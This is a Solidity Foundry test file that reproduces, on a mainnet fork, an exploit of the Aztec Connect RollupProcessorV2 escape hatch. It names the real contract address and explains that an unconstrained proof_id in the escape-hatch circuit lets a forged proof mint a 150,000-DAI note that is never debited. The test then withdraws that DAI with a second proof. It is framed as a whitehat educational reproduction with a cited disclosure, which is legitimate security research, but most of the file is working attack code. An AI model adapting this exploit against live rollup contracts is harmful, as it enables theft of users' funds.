// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : N/A (whitehat educational reproduction; no funds at risk)
// Worst-case impact : ~$2M, matching the separate vulnerability that actually drained the contracts
// Attacker : Any caller during an escape-hatch-open block
// Vulnerable Contract : 0x737901bea3eeb88459df9ef1BE8fF3Ae1B42A2ba (Aztec Connect RollupProcessorV2)
// Attack Tx : N/A (whitehat fork reproduction)
//
// @Analysis
// Chain       : Ethereum mainnet
// Date        : Jun-22-2026
// Fork block  : 25,295,800 (escape hatch open)
// Note        : The Aztec Connect contracts were already drained through a different vulnerability,
//               so this is a purely educational reproduction and no funds are at risk.
// Disclosure  : https://x.com/ivanbogatyy/status/2069159603942596830
//
// @Root cause - escape hatch publishes an unconstrained inner proof_id:
//
//   escape_hatch_circuit.cpp publishes the inner proof id with:
//       public_witness_ct(&composer, 0); // proof_id.
//
//   public_witness_ct() makes the value public but does not constrain it to 0. A prover can publish
//   proof_id = 1 while still proving a join-split with public_input > 0 and output notes funded by
//   that public input.
//
//   RollupProcessor.processDepositsAndWithdrawals() settles public deposits/withdrawals only when:
//       proofId == 0 && (publicInput != 0 || publicOutput != 0)
//
//   Therefore the first escape proof below mints a 150,000-DAI private note from public_input =
//   150_000e18 while
//   publishing proof_id = 1, causing Solidity to skip pending-deposit validation/debit. The second
//   escape proof spends the forged note and withdraws 150,000 DAI to the receiver.
//
// The compact fixture proofs start from the empty rollup roots. This PoC patches only the deployed
// processor's five root/id/size slots to those fixture starting roots. The fork still uses the real
// deployed RollupProcessor, real deployed verifier, real DAI token, and real DAI vault balance.

interface IRollupProcessorV2 {
    function escapeHatch(
        bytes calldata proofData,
        bytes calldata signatures,
        bytes calldata viewingKeys
    ) external;
    function getEscapeHatchStatus() external view returns (bool isOpen, uint256 blocksRemaining);
    function getUserPendingDeposit(
        uint256 assetId,
        address userAddress
    ) external view returns (uint256);
    function dataRoot() external view returns (bytes32);
    function nullRoot() external view returns (bytes32);
    function rootRoot() external view returns (bytes32);
    function dataSize() external view returns (uint256);
    function nextRollupId() external view returns (uint256);
}

interface IERC20Minimal {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    address internal constant ROLLUP = 0x737901bea3eeb88459df9ef1BE8fF3Ae1B42A2ba;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant FAKE_INPUT_OWNER = 0x1111111111111111111111111111111111111111;
    address internal constant RECEIVER = 0x2222222222222222222222222222222222222222;
    string internal constant PROOFS = "src/test/2026-06/aztec_escape_hatch_proofs.txt";

    uint256 internal constant OPEN_ESCAPE_BLOCK = 25_295_800;
    uint256 internal constant ASSET_DAI = 1;
    uint256 internal constant WITHDRAW_AMOUNT = 150_000 ether;

    // Proof field indexes, not byte offsets. Escape proof layout starts with 14 rollup public inputs.
    uint256 internal constant ROLLUP_SIZE = 1;
    uint256 internal constant OLD_DATA_ROOT = 3;
    uint256 internal constant NEW_DATA_ROOT = 4;
    uint256 internal constant OLD_NULL_ROOT = 5;
    uint256 internal constant NEW_NULL_ROOT = 6;
    uint256 internal constant OLD_ROOT_ROOT = 7;
    uint256 internal constant NEW_ROOT_ROOT = 8;
    uint256 internal constant INNER_PROOF_ID = 14;
    uint256 internal constant INNER_PUBLIC_INPUT = 15;
    uint256 internal constant INNER_PUBLIC_OUTPUT = 16;
    uint256 internal constant INNER_ASSET_ID = 17;
    uint256 internal constant INNER_OUTPUT_OWNER = 25;

    // RollupProcessorV2 storage slots.
    bytes32 internal constant SLOT_DATA_ROOT = bytes32(uint256(1));
    bytes32 internal constant SLOT_NULL_ROOT = bytes32(uint256(2));
    bytes32 internal constant SLOT_ROOT_ROOT = bytes32(uint256(3));
    bytes32 internal constant SLOT_DATA_SIZE = bytes32(uint256(4));
    bytes32 internal constant SLOT_NEXT_ROLLUP_ID = bytes32(uint256(5));

    IRollupProcessorV2 internal constant rollup = IRollupProcessorV2(ROLLUP);
    IERC20Minimal internal constant dai = IERC20Minimal(DAI);

    function setUp() public {
        vm.createSelectFork("mainnet", OPEN_ESCAPE_BLOCK);
        fundingToken = DAI;
        attacker = RECEIVER;

        vm.label(ROLLUP, "Aztec RollupProcessorV2");
        vm.label(DAI, "DAI");
        vm.label(RECEIVER, "counterfeit receiver");
    }

    function testExploit() public balanceLog {
        (bool isOpen, uint256 remaining) = rollup.getEscapeHatchStatus();
        require(isOpen && remaining == 200, "escape hatch must be open at fork block");

        bytes memory fakeDepositProof = vm.parseBytes(vm.readLine(PROOFS));
        bytes memory withdrawProof = vm.parseBytes(vm.readLine(PROOFS));
        vm.closeFile(PROOFS);

        _assertFakeDepositShape(fakeDepositProof);
        _assertWithdrawShape(withdrawProof);
        _alignRollupStateToProof(fakeDepositProof);

        uint256 pendingBefore = rollup.getUserPendingDeposit(ASSET_DAI, FAKE_INPUT_OWNER);
        uint256 receiverBefore = dai.balanceOf(RECEIVER);

        rollup.escapeHatch(fakeDepositProof, "", "");

        assertEq(rollup.nextRollupId(), _word(fakeDepositProof, 0) + 1, "fake deposit rollup id");
        assertEq(rollup.dataRoot(), bytes32(_word(fakeDepositProof, NEW_DATA_ROOT)), "fake deposit data root");
        assertEq(rollup.nullRoot(), bytes32(_word(fakeDepositProof, NEW_NULL_ROOT)), "fake deposit null root");
        assertEq(rollup.rootRoot(), bytes32(_word(fakeDepositProof, NEW_ROOT_ROOT)), "fake deposit root root");
        assertEq(rollup.dataSize(), 2, "fake deposit inserts two notes");
        assertEq(rollup.getUserPendingDeposit(ASSET_DAI, FAKE_INPUT_OWNER), pendingBefore, "deposit was debited");

        rollup.escapeHatch(withdrawProof, "", "");

        uint256 gained = dai.balanceOf(RECEIVER) - receiverBefore;
        emit log_named_decimal_uint("counterfeit DAI withdrawn", gained, 18);
        assertEq(gained, WITHDRAW_AMOUNT, "unexpected DAI withdrawn from forged note");
    }

    function testBugIsOneField() public {
        bytes memory proof = vm.parseBytes(vm.readLine(PROOFS));
        vm.closeFile(PROOFS);

        emit log_named_uint("rollup_size", _word(proof, ROLLUP_SIZE));
        emit log_named_uint("published proof_id", _word(proof, INNER_PROOF_ID));
        emit log_named_uint("public_input", _word(proof, INNER_PUBLIC_INPUT));
        emit log_named_uint("public_output", _word(proof, INNER_PUBLIC_OUTPUT));

        bool txNeedsProcessing = _word(proof, INNER_PROOF_ID) == 0
            && (_word(proof, INNER_PUBLIC_INPUT) != 0 || _word(proof, INNER_PUBLIC_OUTPUT) != 0);
        assertFalse(txNeedsProcessing, "Solidity would process this public input");
        assertEq(_word(proof, INNER_PUBLIC_INPUT), WITHDRAW_AMOUNT, "proof does not mint public input value");
    }

    function _assertFakeDepositShape(
        bytes memory proof
    ) internal pure {
        assertEq(_word(proof, ROLLUP_SIZE), 0, "escape rollup size");
        assertEq(_word(proof, INNER_PROOF_ID), 1, "fake deposit proof_id");
        assertEq(_word(proof, INNER_PUBLIC_INPUT), WITHDRAW_AMOUNT, "fake deposit public_input");
        assertEq(_word(proof, INNER_PUBLIC_OUTPUT), 0, "fake deposit public_output");
        assertEq(_word(proof, INNER_ASSET_ID), ASSET_DAI, "fake deposit asset");
    }

    function _assertWithdrawShape(
        bytes memory proof
    ) internal pure {
        assertEq(_word(proof, ROLLUP_SIZE), 0, "escape rollup size");
        assertEq(_word(proof, INNER_PROOF_ID), 0, "withdraw proof_id");
        assertEq(_word(proof, INNER_PUBLIC_INPUT), 0, "withdraw public_input");
        assertEq(_word(proof, INNER_PUBLIC_OUTPUT), WITHDRAW_AMOUNT, "withdraw public_output");
        assertEq(address(uint160(_word(proof, INNER_OUTPUT_OWNER))), RECEIVER, "withdraw receiver");
    }

    function _alignRollupStateToProof(
        bytes memory proof
    ) internal {
        vm.store(ROLLUP, SLOT_DATA_ROOT, bytes32(_word(proof, OLD_DATA_ROOT)));
        vm.store(ROLLUP, SLOT_NULL_ROOT, bytes32(_word(proof, OLD_NULL_ROOT)));
        vm.store(ROLLUP, SLOT_ROOT_ROOT, bytes32(_word(proof, OLD_ROOT_ROOT)));
        vm.store(ROLLUP, SLOT_DATA_SIZE, bytes32(_word(proof, 2)));
        vm.store(ROLLUP, SLOT_NEXT_ROLLUP_ID, bytes32(_word(proof, 0)));
    }

    function _word(
        bytes memory proof,
        uint256 field
    ) internal pure returns (uint256 v) {
        assembly {
            v := mload(add(proof, add(0x20, mul(field, 0x20))))
        }
    }
}
